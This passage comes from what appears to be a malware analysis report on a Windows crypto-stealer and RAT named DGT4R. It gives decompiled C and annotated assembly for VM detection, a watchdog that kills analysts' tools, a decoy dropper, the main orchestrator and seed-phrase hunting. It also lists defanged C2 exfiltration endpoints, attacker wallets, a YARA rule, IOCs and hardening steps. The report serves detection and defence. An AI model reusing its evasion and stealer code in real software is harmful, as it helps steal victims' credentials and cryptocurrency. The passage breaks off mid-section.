  reads staged zip archive, constructs multipart/form-data http post request, and transmits payload to `hxxps[://]doxbin[.]cy/exfiltrate`. wipes staging file on success.

---

### subsystem 10: rat and media spying

#### 42. `rat_command_dispatcher` (rva `+0x1A2100`)
- **prototype**: `void __fastcall rat_command_dispatcher(const uint8_t* cmd_packet, size_t packet_len)`
- **decompiled logic**:
  decodes command byte. routes execution to screen streaming (`0x1`), media capture (`0x2`), powershell execution (`0x3`), or file manipulation (`0x4`).

#### 43. `dxgi_capture_screen_frame` (rva `+0x1A3500`)
- **prototype**: `BOOL __fastcall dxgi_capture_screen_frame(uint8_t** out_jpeg, size_t* out_len)`
- **decompiled logic**:
  uses directx 11 desktop duplication api to acquire gpu desktop surface, converts bgra to jpeg, and returns compressed image buffer.

#### 44. `media_foundation_enum_devices` (rva `+0x1A4200`)
- **prototype**: `BOOL __fastcall media_foundation_enum_devices(void)`
- **decompiled logic**:
  initializes windows media foundation (`MFStartup`), queries connected video and audio capture endpoints, and returns device name array.

#### 45. `execute_hidden_powershell` (rva `+0x1A5080`)
- **prototype**: `BOOL __fastcall execute_hidden_powershell(const wchar_t* command, char** out_response)`
- **decompiled logic**:
  creates anonymous pipe, launches hidden powershell process with output redirection, collects stdout/stderr, and returns output string.

---

## detection signatures, yara rules and incident response

### 1. yara detection rule

the following yara rule detects `DGT4R.exe` across disk and memory without relying on fragile sha hashes. it matches the position-dependent rolling xor routine, the halo's gate direct syscall engine, the exodus asar patch strings, and the hardcoded clipper wallets:

```yara
rule win64_dgt4r_core {
    meta:
        description = "Identifies DGT4R direct syscall dispatch, rolling xor routines, and wallet clipper patterns"
        reference = "Internal Analysis"
        hash_free = "true"

    strings:
        // Position-dependent rolling XOR loop opcodes at +0x671F0
        // movzx eax, byte ptr [rcx+r9]; xor al, r8b; mov [rcx+r9], al; add r8d, r9d; and r8d, 7Fh; inc r9
        $op_rolling_xor = { 0F B6 04 0C 32 C5 88 04 0C 44 03 C1 41 83 E0 7F 48 FF C1 }

        // Dynamic syscall stub at +0x217B50
        // mov r10, rcx; mov eax, [mem]; syscall; retn
        $op_direct_syscall = { 49 89 CA 8B 05 ?? ?? ?? ?? 0F 05 C3 }

        // DJB2 Hash algorithm loop at +0x68940
        // mov r8d, eax; shl r8d, 5; add r8d, eax; add r8d, edx; mov eax, r8d; inc rcx
        $op_djb2_hasher = { 44 8B C0 41 C1 E0 05 44 03 C0 44 03 C2 41 8B C0 48 FF C1 }

        // Hardcoded Attacker Crypto Clipper Wallets
        $btc_wallet = "bc1q88sfcjthknff8ljm7l4vjr83f3z0waezcr92v6" ascii wide
        $eth_wallet = "0x80EB1438CF1F93f368113c54E56684c41cDc6800" ascii wide
        $trx_wallet = "TTdzBZaLn9chv8sJriT7PknrhfG3xCWP34" ascii wide
        $ltc_wallet = "LXKh6UNfsUigqWJ3woUtFP9AE6eYtNyb4X" ascii wide
        $sol_wallet = "6Gk84SVN1rZFTHyvu6Smsk1HFigxvCNUcNFb6RQVzkJz" ascii wide
        $doge_wallet = "DMKeWh37sD8zUUMu4gPsbnMtpok3LNmbG2" ascii wide

        // Carrier Overlay Marker & Mutex
        $bnd_magic = "BND!" ascii
        $sync_mutex = "Local\\SystemSettingsBrokerBootstrap" wide

        // Defanged Attacker Infrastructure
        $c2_domain = "doxbin.cy" ascii wide

        // Target Subsystem Indicators
        $str_exodus_target = "exodus.wallet" ascii wide
        $str_discord_target = "discord_desktop_core" ascii wide
        $str_app_bound_v20 = "v20" ascii

    condition:
        uint16(0) == 0x5A4D and // PE MZ Header
        (
            $op_rolling_xor or
            $op_direct_syscall or
            $op_djb2_hasher
        ) and
        (
            2 of ($btc_wallet, $eth_wallet, $trx_wallet, $ltc_wallet, $sol_wallet, $doge_wallet) or
            ($bnd_magic and $sync_mutex) or
            ($c2_domain and ($str_exodus_target or $str_discord_target))
        )
}
```

---

### 2. comprehensive indicators of compromise (iocs)

#### network indicators
- `hxxps[://]doxbin[.]cy` (primary attacker backend server)
- `hxxps[://]doxbin[.]cy/init` (registration and beaconing)
- `hxxps[://]doxbin[.]cy/exfiltrate` (data exfiltration endpoint)

#### filesystem artifacts
- `%LOCALAPPDATA%\WindowsRecovery\Update.exe` (persistent malware binary copy)
- `%LOCALAPPDATA%\Microsoft\MicrosoftEdge\carrier.exe` (decoy carrier dropped from overlay)
- `%LOCALAPPDATA%\exodus\app-*\resources\app.asar.bak` (original unpatched exodus archive backup)
- `%TEMP%\_<hex_id>.tmp` (data harvesting staging directory)
- `%TEMP%\_aud.tmp` (temporary audio spying staging file)

#### registry keys
- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsRecovery` pointing to `%LOCALAPPDATA%\WindowsRecovery\Update.exe`

#### synchronization primitives
- named mutex: `Local\SystemSettingsBrokerBootstrap`

---

### 3. defenses, hardening and mitigation guidelines

#### 1. hardening electron applications with electron fuses
both the exodus wallet backdoor and discord injection vulnerabilities succeed because desktop electron applications historically load arbitrary modified javascript files or unpacked asar archives from disk without verifying cryptographic code signatures.

development teams must enable **electron fuses** during the final packaging build:

```javascript
// electron-builder configuration / electron fuse toggling
const { flipFuses, FuseVersion, FuseV1Options } = require('@electron/fuses');

flipFuses(pathToExodusExecutable, {
    version: FuseVersion.V1,
    // enforce embedded ASAR signature checking
    [FuseV1Options.EnableEmbeddedAsarIntegrityValidation]: true,
    // disable loading arbitrary unpackaged code
    [FuseV1Options.OnlyLoadAppFromAsar]: true,
    // prevent inspection via command line switches
    [FuseV1Options.EnableNodeCliInspectArguments]: false
});
```

when `EnableEmbeddedAsarIntegrityValidation` is active, the electron runtime validates the sha-256 hash tree of `app.asar` against an immutable digital signature embedded directly inside the signed binary executable. if `DGT4R` modifies even a single byte of `wallet.html` or `wallet/index.js`, the electron binary will refuse to load the altered archive, rendering the backdoor completely inert.

#### 2. restricting user-writable permissions on application directories
the malware exploits the fact that desktop applications stored under `%LOCALAPPDATA%` and `%APPDATA%` run with standard user permissions and are writable by any program running in the user's security context.

administrators can lock down permissions using windows ntfs discretionary access control lists (dacls):

```powershell
# lock down Exodus resources directory to prevent unauthorized writes
$exodusPath = "$env:LOCALAPPDATA\exodus"
icacls "$exodusPath\resources" /deny "$($env:USERNAME):(WD,AD,DE)"

# lock down Discord core module directory
$discordPath = "$env:APPDATA\discord"
icacls "$discordPath\modules" /deny "$($env:USERNAME):(WD,AD,DE)"
```

#### 3. immediate remediation checklist for infected systems
if a system is suspected of infection:
1. **terminate the malware**: kill any running processes named `Update.exe`, `carrier.exe`, or unverified executables in `%LOCALAPPDATA%`.
2. **purge persistence**: remove `WindowsRecovery` from `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`.
3. **reinstall wallets and discord**: delete `%LOCALAPPDATA%\exodus` and `%APPDATA%\discord`, then reinstall fresh copies directly from verified vendor websites to purge all injected javascript backdoors.
4. **transfer cryptocurrency immediately**: if exodus was opened on an infected machine, all private recovery seeds must be treated as completely compromised. generate a brand new seed phrase on an uninfected device or hardware wallet (e.g. ledger / trezor) and transfer all remaining assets immediately.
5. **revoke session tokens and passwords**: invalidate all discord sessions, google oauth tokens, and change passwords for all browsers saved on the machine from a clean, uncompromised device.


---

## deep disassembly and control flow analysis of anti-analysis checks

### 1. cpuid hypervisor inspection routine ( +0x5BA50 )

the following annotated disassembly represents the exact machine instructions executed during the cpuid hypervisor check at rva `+0x5BA50`:

```x86asm
.text:000000000005BA50 check_cpuid_hypervisor proc near
.text:000000000005BA50                 push    rbx
.text:000000000005BA51                 sub     rsp, 20h
.text:000000000005BA55                 mov     eax, 1              ; query feature flags
.text:000000000005BA5A                 cpuid                       ; leaves feature flags in ecx
.text:000000000005BA5C                 bt      ecx, 1Fh            ; test bit 31 (hypervisor present)
.text:000000000005BA60                 jnc     loc_physical_hardware
.text:000000000005BA66
.text:000000000005BA66                 ; hypervisor bit is active; query vendor string
.text:000000000005BA66                 mov     eax, 40000000h      ; hypervisor interface base
.text:000000000005BA6B                 cpuid                       ; returns vendor string in ebx, ecx, edx
.text:000000000005BA6D                 lea     rdi, [rsp+28h]
.text:000000000005BA72                 mov     [rdi], ebx          ; characters 0-3
.text:000000000005BA74                 mov     [rdi+4], ecx        ; characters 4-7
.text:000000000005BA77                 mov     [rdi+8], edx        ; characters 8-11
.text:000000000005BA7A                 mov     byte ptr [rdi+0Ch], 0 ; null terminator
.text:000000000005BA7E
.text:000000000005BA7E                 ; compare against known VM vendor strings
.text:000000000005BA7E                 lea     rsi, [rsp+28h]
.text:000000000005BA83                 lea     rdx, aVmware        ; "VMwareVMware"
.text:000000000005BA8A                 call    str_compare_case_insensitive
.text:000000000005BA8F                 test    eax, eax
.text:000000000005BA91                 jz      loc_vm_detected
.text:000000000005BA97
.text:000000000005BA97                 lea     rsi, [rsp+28h]
.text:000000000005BA9C                 lea     rdx, aMicrosoftHv   ; "Microsoft Hv"
.text:000000000005BAA3                 call    str_compare_case_insensitive
.text:000000000005BAA8                 test    eax, eax
.text:000000000005BAAA                 jz      loc_vm_detected
.text:000000000005BAB0
.text:000000000005BAB0                 lea     rsi, [rsp+28h]
.text:000000000005BAB5                 lea     rdx, aKvm           ; "KVMKVMKVM"
.text:000000000005BABC                 call    str_compare_case_insensitive
.text:000000000005BAC1                 test    eax, eax
.text:000000000005BAC3                 jz      loc_vm_detected
.text:000000000005BAC9
.text:000000000005BAC9 loc_physical_hardware:
.text:000000000005BAC9                 xor     eax, eax            ; return FALSE (clean)
.text:000000000005BACB                 add     rsp, 20h
.text:000000000005BACF                 pop     rbx
.text:000000000005BAD0                 retn
.text:000000000005BAD1
.text:000000000005BAD1 loc_vm_detected:
.text:000000000005BAD1                 mov     eax, 1              ; return TRUE (sandbox)
.text:000000000005BAD6                 add     rsp, 20h
.text:000000000005BADA                 pop     rbx
.text:000000000005BADB                 retn
.text:000000000005BADB check_cpuid_hypervisor endp
```

---

### 2. smbios firmware table parsing ( +0x5AC10 )

the firmware inspection routine scans raw bios memory structures for virtualization artifacts:

```c
// decompiled smbios firmware scanner at +0x5AC10
BOOL check_smbios_firmware_strings(void) {
    DWORD signature = 'RSMB'; // Raw SMBIOS firmware table provider
    DWORD table_size = GetSystemFirmwareTable(signature, 0, NULL, 0);
    if (table_size == 0) {
        return FALSE;
    }

    uint8_t* buffer = (uint8_t*)malloc(table_size);
    if (!buffer) return FALSE;

    if (GetSystemFirmwareTable(signature, 0, buffer, table_size) != table_size) {
        free(buffer);
        return FALSE;
    }

    // search for virtual machine vendor signatures across table buffer
    const char* blacklisted_strings[] = {
        "vbox", "qemu", "vmware", "virtualbox", "hyper-v", "bochs", "xen", NULL
    };

    // convert all buffer text to lowercase and search
    for (DWORD i = 0; i < table_size - 10; i++) {
        for (int k = 0; blacklisted_strings[k] != NULL; k++) {
            size_t needle_len = strlen(blacklisted_strings[k]);
            if (i + needle_len <= table_size) {
                if (_strnicmp((const char*)(buffer + i), blacklisted_strings[k], needle_len) == 0) {
                    free(buffer);
                    return TRUE; // sandbox detected
                }
            }
        }
    }

    free(buffer);
    return FALSE; // clean hardware
}
```

---

### 3. active anti-analysis watchdog and process termination engine ( +0x5F760, +0x5C250, +0x510D0, +0x514E0, +0x5F990 )

unlike passive anti-analysis routines that only execute once upon program launch, `DGT4R` deploys an aggressive, persistent active defense watchdog thread (`watchdog_anti_analysis_thread` at `+0x5F990`).

#### continuous watchdog thread cycle

upon initial execution in `win_main` (`+0xC860A`), the malware executes an immediate sweep via `kill_analysis_tools_and_debuggers` (`+0x5F760`). it then allocates a thread context and launches `watchdog_anti_analysis_thread` (`+0x5F990`) in the background using `_beginthreadex`:

```c
// decompiled watchdog thread loop at +0x5F990
void __noreturn watchdog_anti_analysis_thread(void) {
    while (TRUE) {
        // execute active detection and termination sweep
        kill_analysis_tools_and_debuggers();

        // delay execution 500ms using direct kernel syscall
        if (g_SyscallDirectActive && syscall_nt_delay_execution_entry != 0) {
            LARGE_INTEGER interval;
            interval.QuadPart = -5000000; // 500ms in 100ns units
            syscall_nt_delay_execution(FALSE, &interval);
        } else {
            // fallback to dynamic kernel32!Sleep resolution
            pfn_sleep_api(500);
        }
    }
}
```

#### in-memory analyst tool blacklist construction ( +0x5C250 )

the subroutine `build_analyst_tool_blacklist` at `+0x5C250` dynamically constructs an in-memory database of over 100 security research and reverse engineering tool process names:

- **disassemblers and debuggers**: `x64dbg.exe`, `x32dbg.exe`, `ollydbg.exe`, `windbg.exe`, `immunity debugger.exe`, `edb.exe`, `ida.exe`, `ida64.exe`, `idaq.exe`, `idaq64.exe`, `ghidra.exe`, `ghidrarun.exe`, `binaryninja.exe`, `binja.exe`, `radare2.exe`, `r2.exe`, `cutter.exe`, `rizin.exe`, `angr.exe`, `hopper.exe`.
- **.net and java decompilers**: `dnspy.exe`, `dnspyex.exe`, `ilspy.exe`, `dotpeek.exe`, `reflector.exe`, `justdecompile.exe`, `ildasm.exe`, `jd-gui.exe`, `jad.exe`, `jeb.exe`, `bytecode-viewer.exe`, `recaf.exe`.
- **android and mobile tools**: `apktool.exe`, `dex2jar.exe`, `jadx.exe`, `jadx-gui.exe`, `apkstudio.exe`, `androguard.exe`, `andbug.exe`, `apkinspector.exe`.
- **system and process monitors**: `processhacker.exe`, `procmon.exe`, `procmon64.exe`, `procexp.exe`, `procexp64.exe`, `processexplorer.exe`, `systeminformer.exe`, `autoruns.exe`, `autoruns64.exe`, `sysmon.exe`, `sysmon64.exe`, `procdump.exe`, `handle.exe`, `listdlls.exe`, `tcpview.exe`, `livekd.exe`.
- **network sniffers and proxies**: `wireshark.exe`, `fiddler.exe`, `httpdebugger.exe`, `httpdebuggerui.exe`, `httpanalyzer.exe`, `burpsuite.exe`, `charlesproxy.exe`, `mitmproxy.exe`, `fakenet.exe`, `inetsim.exe`.
- **hex editors and pe analysis**: `hxd.exe`, `010editor.exe`, `hexfiend.exe`, `imhex.exe`, `rehex.exe`, `pe-bear.exe`, `pestudio.exe`, `pestudio64.exe`, `cff explorer.exe`, `die.exe`, `detect it easy.exe`, `peid.exe`, `exeinfope.exe`, `resourcehacker.exe`.
- **dynamic hooks and memory injectors**: `frida.exe`, `fridaps.exe`, `pin.exe`, `dynamorio.exe`, `apimonitor.exe`, `apimonitor-x64.exe`, `scylla.exe`, `cheatengine.exe`, `scanmem.exe`, `artmoney.exe`.

#### process snapshot comparison and direct syscall termination ( +0x510D0, +0x514E0 )

the scan engine (`scan_and_terminate_blacklisted_processes` at `+0x510D0`) enumerates running system processes using `sub_50980` and performs case-insensitive comparisons:

```c
// decompiled process termination engine at +0x514E0
bool __fastcall terminate_process_direct_syscall(unsigned int target_pid) {
    if (target_pid == 0 || target_pid == GetCurrentProcessId()) {
        return false;
    }

    // open target process with PROCESS_TERMINATE | SYNCHRONIZE ( 0x100001 )
    HANDLE hProcess = open_process_internal(target_pid, 0x100001 );
    if (!hProcess || hProcess == INVALID_HANDLE_VALUE) {
        return false;
    }

    bool success = false;

    // invoke direct unhooked kernel syscall ZwTerminateProcess ( +0x69B10 )
    if (g_SyscallDirectActive && syscall_nt_terminate_process_entry != 0) {
        NTSTATUS status = syscall_nt_terminate_process(hProcess, 0);
        success = (status >= 0);
    } else {
        // fallback to dynamic kernel32!TerminateProcess resolution
        success = (qword_33A4A0(hProcess, 0) != 0);
    }

    if (success) {
        // block up to 1000ms until the analysis tool process object is fully terminated
        WaitForSingleObject(hProcess, 1000);
    }

    close_handle_internal(hProcess);
    return success;
}
```

if an analyst launches `x64dbg`, `procmon`, or `ida64` to inspect malware execution, the background watchdog detects the process within 500ms and issues an unhooked kernel syscall kill signal, terminating the analyst's tool instantly.

### 4. carrier decoy extraction and process fork ( +0x1242A0 )

the carrier binder unpacks the decoy application stored past the normal pe sections:

```c
// decompiled carrier binder logic at +0x1242A0
BOOL extract_carrier_decoy(void) {
    wchar_t current_exe_path[MAX_PATH];
    GetModuleFileNameW(NULL, current_exe_path, MAX_PATH);

    HANDLE hFile = CreateFileW(
        current_exe_path,
        GENERIC_READ,
        FILE_SHARE_READ,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    DWORD file_size = GetFileSize(hFile, NULL);
    uint8_t* file_bytes = (uint8_t*)malloc(file_size);
    DWORD bytes_read = 0;
    ReadFile(hFile, file_bytes, file_size, &bytes_read, NULL);
    CloseHandle(hFile);

    // scan for 'BND!' magic identifier in overlay
    const uint8_t bnd_magic[4] = { 'B', 'N', 'D', '!' };
    uint8_t* overlay_ptr = NULL;

    for (DWORD i = 0; i < file_size - 8; i++) {
        if (memcmp(file_bytes + i, bnd_magic, 4) == 0) {
            overlay_ptr = file_bytes + i + 4;
            break;
        }
    }

    if (!overlay_ptr) {
        free(file_bytes);
        return FALSE;
    }

    // read unpacked decoy size (stored as 32-bit LE integer following magic)
    uint32_t decoy_size = *(uint32_t*)overlay_ptr;
    uint8_t* decoy_data = overlay_ptr + 4;

    wchar_t drop_path[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_LOCAL_APPDATA, NULL, 0, drop_path);
    wcscat_s(drop_path, MAX_PATH, L"\\Microsoft\\MicrosoftEdge");
    CreateDirectoryW(drop_path, NULL);
    wcscat_s(drop_path, MAX_PATH, L"\\carrier.exe");

    HANDLE hOut = CreateFileW(
        drop_path,
        GENERIC_WRITE,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );

    if (hOut != INVALID_HANDLE_VALUE) {
        DWORD bytes_written = 0;
        WriteFile(hOut, decoy_data, decoy_size, &bytes_written, NULL);
        CloseHandle(hOut);

        // launch clean decoy application to disguise malicious background activity
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpFile = drop_path;
        sei.nShow = SW_SHOWNORMAL;
        ShellExecuteExW(&sei);
    }

    free(file_bytes);
    return TRUE;
}
```

---

## technical references and further reading

1. **Microsoft Learn**: [User-Mode and Kernel-Mode Transitions in Windows x64](https://learn.microsoft.com/en-us/windows-hardware/drivers/gettingstarted/user-mode-and-kernel-mode)
2. **Hell's Gate & Halo's Gate Research**: [Dynamic System Service Number Resolution via NTDLL In-Memory Disassembly](https://github.com/am0nsec/HellsGate)
3. **Electron Framework Security**: [Hardening Electron Applications Using Build-Time Fuses](https://www.electronjs.org/docs/latest/tutorial/fuses)
4. **Bitcoin Improvement Proposals**: [BIP-0039: Mnemonic Code for Generating Deterministic Keys](https://github.com/bitcoin/bips/blob/master/bip-0039.mediawiki)
5. **Chromium Project**: [App-Bound Encryption Architecture (v20)](https://chromium.googlesource.com/chromium/src/+/main/docs/security/app_bound_encryption.md)
6. **Microsoft Win32 Cryptography**: [CryptUnprotectData Function (DPAPI)](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptunprotectdata)
7. **Google LevelDB**: [LevelDB Table Format Specification](https://github.com/google/leveldb/blob/main/doc/table_format.md)

---

## core execution orchestrator and lock-free thread pool architecture

### 1. binary entry point and orchestration lifecycle (`win_main` at +0xC7540 )

the primary execution sequence of `DGT4R` begins in `win_main` at rva `+0xC7540`. across 1,325 lines of decompiled logic, this master orchestrator establishes environmental safety, dynamically reconstructs native kernel system call tables, queries initial configuration tasking from the remote backend host, and dispatches parallel worker tasks.

```c
// decompiled win_main execution flow at +0xC7540
int __stdcall win_main(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
    // phase 1: anti-analysis and sandbox barrier
    if (!check_anti_analysis()) {
        // silently terminate process with exit code 0 if virtualization detected
        return 0;
    }

    // phase 2: carrier decoy execution
    // carves out clean decoy program from BND! file overlay into %LOCALAPPDATA%\Microsoft\MicrosoftEdge\carrier.exe
    extract_carrier_decoy();

    // phase 3: direct kernel syscall table initialization
    // parses PEB, walks InLoadOrderModuleList to locate ntdll.dll, hashes exports via DJB2, and sorts SSNs
    init_direct_syscall_table();

    // phase 4: initial registration and beaconing handshake
    // fingerprints machine GUID, CPU, RAM, OS, active AV, and queries module tasking
    TASK_CONFIG initial_config;
    if (!c2_get_initial_config(&initial_config)) {
        // if remote server is unreachable, default fallback flags are activated
        initial_config.clipper_enabled = TRUE;
        initial_config.exodus_patch = TRUE;
        initial_config.discord_inject = TRUE;
        initial_config.stealer_enabled = TRUE;
    }

    // phase 5: launch background persistence and injection threads
    HANDLE hWorkers[16];
    DWORD worker_count = 0;

    // 1. crypto clipper background loop (500ms delay polling)
    if (initial_config.clipper_enabled) {
        hWorkers[worker_count++] = spawn_clipper_thread();
    }

    // 2. exodus desktop asar backdoor and seed keylogger injection
    if (initial_config.exodus_patch) {
        HANDLE hExodus = spawn_exodus_injector_thread();
        thread_join(hExodus); // wait for initial patch to commit to disk
    }

    // 3. discord core module index.js direct syscall injection
    if (initial_config.discord_inject) {
        HANDLE hDiscord = spawn_discord_injector_thread();
        thread_join(hDiscord);
        spawn_discord_spreader_thread(); // initialize background DM worm broadcaster
    }

    // phase 6: initialize lock-free parallel stealer thread pool
    TASK_POOL task_pool;
    init_stealer_task_pool(&task_pool);

    // dispatch specialized asynchronous workers
    spawn_screenshot_thread(&task_pool);
    spawn_system_info_thread(&task_pool);
    spawn_crypto_wallet_thread(&task_pool);
    spawn_extension_stealer_thread(&task_pool);
    spawn_file_grabber_thread(&task_pool);
    spawn_telegram_stealer_thread(&task_pool);
    spawn_desktop_app_thread(&task_pool);
    spawn_bip39_hunter_thread(&task_pool);

    // phase 7: execute batch harvesting and monitor completion
    execute_stealer_batch(&task_pool);

    // phase 8: enter persistent background maintenance loop
    while (TRUE) {
        sys_ZwDelayExecution(FALSE, &g_ThirtySecondInterval);
        task_c2_heartbeat();
    }

    return 0;
}
```

---

### 2. lock-free parallel task pool coordination ( +0xC5420 )

rather than using win32 mutexes or critical sections (which introduce thread contention, context switching latency, and telemetry signatures monitored by edr thread-profiling hooks), `DGT4R` coordinates its parallel harvesting threads using lock-free atomic operations via `_InterlockedDecrement`:

![diagram9](images/diagram9.svg)

#### atomic task coordination mechanics

1. a shared 32-bit atomic counter `ActiveTaskCount` is initialized with the number of worker tasks to execute:
   `ActiveTaskCount = N_tasks`
2. each worker task is spawned via `_beginthreadex` as an independent asynchronous thread.
3. upon completing its respective extraction, decryption, and staging sequence, each worker executes an atomic decrement:
   ```c
   _InterlockedDecrement(&task_pool->ActiveTaskCount);
   ```
4. the coordinator thread at `+0xC5420` executes micro-sleeps via `ZwDelayExecution` while polling `ActiveTaskCount`.
5. when `ActiveTaskCount` reaches zero, the coordinator signals the compression and staging pipeline (`+0xDEF10`) to package the harvest into `%TEMP%\_<hex_id>.tmp` and upload it via `upload_to_c2` (`+0x47DF0`).

```x86asm
.text:00000000000C68DB task_worker_completion_stub proc near
.text:00000000000C68DB                 mov     rax, [rsp+arg_0]    ; load task pool context pointer
.text:00000000000C68E0                 lock dec dword ptr [rax]    ; atomic decrement: ActiveTaskCount--
.text:00000000000C68E3                 retn
.text:00000000000C68E3 task_worker_completion_stub endp
```

---

### 3. the 14 specialized background worker threads

the binary registers 14 discrete thread entry points within its internal dispatch table (`0xC3380` - `0xC3790`):

| worker symbol | rva | execution interval | operational focus |
| :--- | :--- | :--- | :--- |
| `thread_clipper` | `+0xC3380` | continuous (500ms sleep) | clipboard monitoring, regex matching, and crypto wallet replacement |
| `thread_exodus_injector` | `+0xC33B0` | one-shot on startup / update | in-memory unpacking and backdooring of `%LOCALAPPDATA%\exodus\app-*\resources\app.asar` |
| `thread_discord_injector` | `+0xC3470` | one-shot on startup | direct syscall overwriting of discord core module `index.js` |
| `thread_discord_spreader` | `+0xC34D0` | continuous (1.5s sleep) | dm channel enumeration and worm message dissemination |
| `thread_screenshot_worker` | `+0xC3510` | periodic / on-demand | gdi+ / dxgi desktop screen frame capture and png compression |
| `thread_chromium_stealer` | `+0xC3550` | batch on startup | dpapi master key extraction, v20 app-bound decryption, sqlite harvesting |
| `thread_system_info_worker`| `+0xC3590` | batch on startup | hardware fingerprinting, cpu/gpu profiling, av enumeration, network routing |
| `thread_wallet_stealer_worker` | `+0xC35D0` | batch on startup | carving filesystem directories for 13 desktop crypto wallet clients |
| `thread_extension_stealer_worker` | `+0xC3610` | batch on startup | parsing chromium web3 extension leveldb datastores (metamask, phantom, etc.) |
| `thread_file_grabber_worker` | `+0xC3650` | batch on startup | recursive scanning of desktop and user folders for sensitive keyword files |
| `thread_telegram_stealer_worker` | `+0xC3690` | batch on startup | harvesting telegram desktop `tdata` session keys and auth structures |
| `thread_desktop_app_stealer_worker` | `+0xC36D0` | batch on startup | harvesting steam, filezilla, and vpn client sessions |
| `thread_bip39_stealer_worker` | `+0xC3710` | batch on startup | scanning process memory and caches against unrolled 2048-word dictionary |
| `thread_firefox_stealer_worker` | `+0xC3750` | batch on startup | dynamic loading of `nss3.dll` and `PK11SDR_Decrypt` credential recovery |

---

## the bip-39 dictionary unroller and in-memory mnemonic hunter

### 1. the 41,141-instruction dictionary unroller (`init_bip39_wordlist` at +0x5010 )

one of the most technically unusual features in `DGT4R` is how it implements bip-39 mnemonic recovery. standard stealers typically embed a plain text wordlist in their binary or download it from a remote server. `DGT4R` embeds the entire canonical english bip-39 dictionary (2,048 words) directly inside a massive 172,670-byte assembly subroutine at `+0x5010`, completely unrolled across 41,141 instructions.

![diagram10](images/diagram10.svg)

every single word is synthesized at runtime using rolling xor register math:

```x86asm
.text:0000000000005044                 mov     dl, 4Dh             ; seed key = 0x4D ('M')
.text:0000000000005046                 xor     ebx, ebx
.text:0000000000005048                 mov     ecx, ebx
.text:000000000000504A                 lea     rbp, cs:0
.text:0000000000005051                 nop     dword ptr [rax+00h]
.text:0000000000005060
.text:0000000000005060 loc_unrolled_word_loop:
.text:0000000000005060                 movzx   eax, dl             ; load current rolling key
.text:0000000000005063                 xor     al, [rcx+rbp+27AE38h] ; decrypt character from table
.text:000000000000506A                 mov     [rcx+rsi], al       ; write decrypted byte to word buffer
.text:000000000000506D                 movzx   eax, cl
.text:0000000000005070                 add     al, dl              ; update rolling key: key = key + index
.text:0000000000005072                 movzx   edx, al
```

this unrolled block executes 2,048 consecutive times without loops or branch instructions, populating a heap-allocated hash table with the complete list of canonical english bip-39 words:
- index 0: `abandon`
- index 1: `ability`
- index 2: `able`
- ...
- index 2047: `zoo`

because the wordlist is never stored as plaintext strings in the binary sections, static yara signatures matching bip-39 wordlist arrays produce zero detections.

---

### 2. in-memory mnemonic phrase hunting (`collect_bip39_phrases` at +0xD5E00 )

once the wordlist hash set is constructed in memory, the background worker thread `thread_bip39_stealer_worker` (`+0xC3710`) begins scanning for cryptocurrency seed phrases:

1. **process memory inspection**:
   - uses `ZwOpenProcess` and `ZwQueryVirtualMemory` to map memory pages of open desktop wallet processes, browsers, and text editors.
   - reads commited memory regions with `ZwReadVirtualMemory`.
2. **clipboard & cache hunting**:
   - inspects clipboard history buffers and temporary browser cache files.
3. **tokenization and dictionary validation**:
   - tokenizes memory buffers into word sequences matching pattern `[a-z]{3,8}`.
   - checks if 12, 15, 18, 21, or 24 consecutive words exist where **every single word** is a valid member of the 2,048-word bip-39 dictionary.
4. **cryptographic checksum verification**:
   - for a 12-word phrase, the first 128 bits represent entropy and the final 4 bits represent the sha-256 checksum of the entropy: `Checksum = SHA256(Entropy)[0..3]`.
   - the malware validates the checksum locally. if the checksum is valid, it confirms that the sequence is a genuine cryptocurrency recovery seed phrase and immediately writes it to `%TEMP%\_<hex_id>.tmp\seeds.txt`.

---

## web3 browser extension leveldb stealer architecture

### 1. targeted web3 browser extensions ( +0xD6800 )

modern cryptocurrency users frequently manage non-custodial assets using browser extensions rather than desktop clients. `DGT4R` systematically scans for web3 wallet extensions across chromium-based browsers:

![diagram11](images/diagram11.svg)

the targeted extension directory identifiers:

| web3 wallet | browser extension id | storage path under `Local Extension Settings` |
| :--- | :--- | :--- |
| **MetaMask** | `nkbihfbeogaeaoehlefnkodbefgpgknn` | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn` |
| **Phantom (Solana)** | `bfnaelmomeimhlpmgjnjophhpkkoljpa` | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\bfnaelmomeimhlpmgjnjophhpkkoljpa` |
| **Coinbase Wallet** | `hnfanknocfeofbddgcijnmhnfnkdnaad` | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\hnfanknocfeofbddgcijnmhnfnkdnaad` |
| **TronLink (TRX)** | `ibnejdfjmmkpcnlpebklmnkoeoihofec` | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\ibnejdfjmmkpcnlpebklmnkoeoihofec` |
| **Ronin Wallet (Axie)** | `fnjhmkhhmkbjkkabndcnnogagogbneec` | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\fnjhmkhhmkbjkkabndcnnogagogbneec` |
| **Binance Chain** | `fhbohimaelbohpjbbldcngcnapndodjp` | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\fhbohimaelbohpjbbldcngcnapndodjp` |
| **Exodus Web3** | `aholpfdialjgjfhomihkjbmgjidlcdno` | `%LOCALAPPDATA%\Google\Chrome\User Data\Default\Local Extension Settings\aholpfdialjgjfhomihkjbmgjidlcdno` |
| **Brave Wallet** | `odbfpeeihdkbihmopkbjmoonfanlbfcl` | `%LOCALAPPDATA%\BraveSoftware\Brave-Browser\User Data\Default\Local Extension Settings\...` |

---

### 2. leveldb datastore parsing and vault record carving ( +0x91FF0 )

chromium extensions store their state inside google's embedded key-value storage engine, **leveldb**. within each extension directory, files include:
- `CURRENT`: pointer to active manifest.
- `MANIFEST-*`: log of leveldb transaction versions.
